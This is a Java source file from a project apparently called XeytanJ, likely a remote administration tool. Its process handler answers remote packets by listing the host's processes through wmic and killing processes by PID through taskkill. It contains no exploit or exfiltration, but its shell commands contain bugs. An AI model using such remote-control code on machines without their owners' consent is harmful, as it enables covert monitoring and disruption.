package com.melardev.xeytanj.services;

import com.melardev.xeytanj.IApplication;
import com.melardev.xeytanj.logger.ILogger;
import com.melardev.xeytanj.models.ProcessStructure;
import com.melardev.xeytanj.net.packets.process.PacketProcess;
import com.melardev.xeytanj.net.packets.process.PacketProcessCommandRequest;
import com.melardev.xeytanj.net.packets.process.PacketProcessList;
import com.melardev.xeytanj.net.packets.process.PacketProcessList.Format;
import com.melardev.xeytanj.net.packets.process.PacketProcessList.InfoLevel;
import com.melardev.xeytanj.remote.PacketHandler;

import javax.swing.*;
import javax.swing.filechooser.FileSystemView;
import java.io.BufferedReader;
import java.io.File;
import java.io.IOException;
import java.io.InputStreamReader;
import java.nio.file.InvalidPathException;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.LinkedList;
import java.util.List;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class ProcessHandler implements PacketHandler<PacketProcess> {

    private final IApplication application;
    private FileSystemView fsv = FileSystemView.getFileSystemView();
    private ILogger logger;

    public ProcessHandler(IApplication application) {
        this.application = application;
    }

    private void sendProcessList(String[] columnNames) {
        logger.traceCurrentMethodName();
        String cmdToExecute = getCommandToExecute(columnNames);
        try {
            logger.debug(cmdToExecute);
            Process process = Runtime.getRuntime().exec(cmdToExecute.toString());

            String line = "";
            boolean firstTime = true;
            BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(process.getInputStream()));
            StringBuilder stringBuilder = new StringBuilder();
            String executablePath;
            ArrayList<ImageIcon> icons = new ArrayList<ImageIcon>();
            int execount = "ExecutablePath".length();
            List<ProcessStructure> processStructures = new LinkedList<>();
            while ((line = bufferedReader.readLine()) != null) {
                if (line.isEmpty())
                    continue;
                if (firstTime) {
                    firstTime = false;
                    continue;
                }
                String[] parts = line.split(",");
                if (parts.length != columnNames.length + 1) // this should not happen
                    continue;

                if (parts[0].isEmpty() && parts[1].isEmpty() && parts[2].isEmpty())
                    continue;

                ProcessStructure processStructure = new ProcessStructure();

                if (!parts[1].isEmpty()) {
                    parts[1] = parts[1].replace("\\\\?\\", "");
                    parts[1] = parts[1].replace("\\", "/");

                    processStructure.setProcessPath(parts[1]);
                    ImageIcon tempicon = null;
                    try {
                        tempicon = (ImageIcon) fsv.getSystemIcon(new File(parts[1]));
                    } catch (InvalidPathException ex) {
                        ex.printStackTrace();
                    }
                    if (tempicon != null)
                        processStructure.setIcon(tempicon);
                }

                if (!parts[2].isEmpty())
                    processStructure.setProcessName(parts[2]);

                if (!parts[3].isEmpty())
                    processStructure.setPid(Integer.valueOf(parts[3]));

                processStructures.add(processStructure);
            }

            PacketProcessList packet = new PacketProcessList();
            packet.setProcessStructures(processStructures);
            application.sendPacket(packet);

        } catch (IOException e) {
            e.printStackTrace();
        }
    }
    /*
    public void start() {
        FileSystemView fsv = FileSystemView.getFileSystemView();
        do {
            String cmdToExecute = getCommandToExecute();
            try {
                debugOutput(cmdToExecute.toString());
                Process p = Runtime.getRuntime().exec(cmdToExecute.toString());

                if (format == Format.CSV) {
                    String line = "";
                    BufferedReader isBr = new BufferedReader(new InputStreamReader(p.getInputStream()));
                    boolean first = true;
                    int columnPath = -1;
                    ArrayList<ImageIcon> icons = new ArrayList<ImageIcon>();
                    StringBuilder sb = new StringBuilder();
                    while ((line = isBr.readLine()) != null) {
                        if (line.equals(""))
                            continue;
                        sb.append(line);
                        if (first) {
                            sb.append("SEPARATORSEPARATOR");
                            columnPath = Arrays.asList(line.split(",")).indexOf("ExecutablePath");
                            first = false;
                            continue;
                        }
                        sb.append(",");
                        String fullPath = extractExecutablePath(line, columnPath);
                        if (fullPath != null) {
                            ImageIcon tempicon = (ImageIcon) fsv.getSystemIcon(new File(fullPath));
                            if (tempicon == null)
                                System.out.println("");
                            icons.add(tempicon);
                        } else
                            icons.add(null);
                    }

                    PacketProcessList packet = new PacketProcessList(level, cmdToExecute, sb.toString(), icons,
                            columnNames.length);
                    sockOut.writeObject(packet);
                } else if (format == Format.LIST) {
                    String line = "";
                    boolean firstTime = true;
                    BufferedReader isBr = new BufferedReader(new InputStreamReader(p.getInputStream()));
                    StringBuilder sb = new StringBuilder();
                    String executablePath;
                    ArrayList<ImageIcon> icons = new ArrayList<ImageIcon>();
                    int execount = "ExecutablePath".length();
                    while ((line = isBr.readLine()) != null) {
                        if (line.equals(""))
                            continue;
                        sb.append(line + "SEPARATOR_XEYTAN");
                        int index = line.indexOf("ExecutablePath=");
                        if (index == -1)
                            continue;
                        executablePath = line.substring(index + execount + 1).trim();
                        if (executablePath != null && !executablePath.isEmpty()) {
                            ImageIcon tempicon = (ImageIcon) fsv.getSystemIcon(new File(executablePath));
                            if (tempicon == null)
                                System.out.println("");
                            icons.add(tempicon);
                        } else {
                            if (firstTime) { // We Should Have n -1 icons , because we don't have to add icon to the header row
                                firstTime = false;
                                continue;
                            }
                            icons.add(null);
                        }
                    }

                    PacketProcessList packet = new PacketProcessList(level, cmdToExecute, sb.toString(), icons,
                            columnNames.length);
                    sockOut.writeObject(packet);
                }
            } catch (IOException e) {
                e.printStackTrace();
            }
        } while (hasMoreToDo());

        try {
            socket.close();
        } catch (IOException e) {
            // TODO Auto-generated catch block
            e.printStackTrace();
        }

    }
    */

    private void execShellCommand(String command) {
        logger.traceCurrentMethodName();
        try {
            Runtime.getRuntime().exec(command).waitFor();
        } catch (IOException e) {
            // TODO Auto-generated catch block
            e.printStackTrace();
        } catch (InterruptedException e) {
            // TODO Auto-generated catch block
            e.printStackTrace();
        }
    }

    private String getCommandToExecute(String[] columnNames) {
        logger.traceCurrentMethodName();
        List<String> columnNameList = null;
        String os = System.getProperty("os.name").toLowerCase();
        if (os.contains("win")) {
            if (columnNames == null)
                columnNameList = Arrays.asList("Name", "ProcessId", "ExecutablePath");
            else {
                columnNameList = Arrays.asList(columnNames);

                if (!columnNameList.contains("ExecutablePath"))
                    columnNameList.add("ExecutablePath");
            }

            StringBuilder sb = new StringBuilder();
            sb.append("wmic PROCESS GET ");
            for (int i = 0; i < columnNameList.size(); i++) {
                sb.append(columnNameList.get(i));
                if (i < columnNameList.size() - 1)
                    sb.append(",");
            }
            //sb.append(" /FORMAT:" + format.toString());
            sb.append(" /FORMAT:csv");
            return sb.toString();
        } else {
            // TODO: implement
            return null;
        }
    }

    public static void main(String[] args) {

        try {
            Process p = Runtime.getRuntime().exec("wmic PROCESS GET Name,ProcessId,ExecutablePath /FORMAT:list");
            BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
            String line;
            StringBuilder sb = new StringBuilder();
            String[] columns = new String[]{"Name", "ProcessId", "ExecutablePath"};
            Pattern pattern;
            int currentCol = 0;
            ArrayList<ArrayList<String>> result = new ArrayList<>();
            ArrayList<String> row = new ArrayList<>();
            while ((line = br.readLine()) != null) {
                //System.out.println(line);
                sb.append(line + "\n");

                if (line.trim().equals(""))
                    continue;

                pattern = Pattern.compile(".*" + columns[currentCol] + "=(.*)",
                        Pattern.CASE_INSENSITIVE | Pattern.DOTALL);
                Matcher matches = pattern.matcher(line);

                if (matches.matches()) {
                    //System.out.printf("\t %s:%s \n", columns[currentCol], matches.group(1));
                    row.add(matches.group(1));
                    currentCol++;
                    if (currentCol == columns.length) {
                        currentCol = 0;
                        result.add(row);
                    }
                }
            }

            for (ArrayList<String> arr : result) {
                System.out.printf("\n");
                for (int i = 0; i < columns.length; i++) {
                    System.out.printf("%s:%s\n", columns[i], arr.get(i));
                }
            }

        } catch (IOException e) {
            // TODO Auto-generated catch block
            e.printStackTrace();
        }

    }

    private String extractExecutablePath(String line, int index) {
        logger.traceCurrentMethodName();
        String[] cols = line.split(",");
        if (cols[index].equals(""))
            return null;

        return cols[index];
    }

    @Override
    public void handlePacket(PacketProcess packet) {
        if (packet.getClass() == PacketProcessList.class) {
            PacketProcessList packetProcessList = ((PacketProcessList) packet);
            InfoLevel level = packetProcessList.getLevel();
            String[] columnNames = packetProcessList.getColumnNames();
            Format format = packetProcessList.getFormat();
            sendProcessList(columnNames);
        } else if (packet.getClass() == PacketProcessCommandRequest.class) {
            PacketProcessCommandRequest packetProcess = (PacketProcessCommandRequest) packet;
            logger.trace("Handling " + packetProcess.getProcessCommand());
            if (packetProcess.getProcessCommand() != null) {
                switch (packetProcess.getProcessCommand()) {
                    case KILL_PROCESS:
                        if (packetProcess.getPid() != null) //Kill by PID
                            execShellCommand("taskkill /t /f /pid" + packetProcess.getPid());
                        break;
                    default:
                        break;
                }
            }
        }
    }

    @Override
    public void setLogger(ILogger logger) {
        this.logger = logger;
    }
}
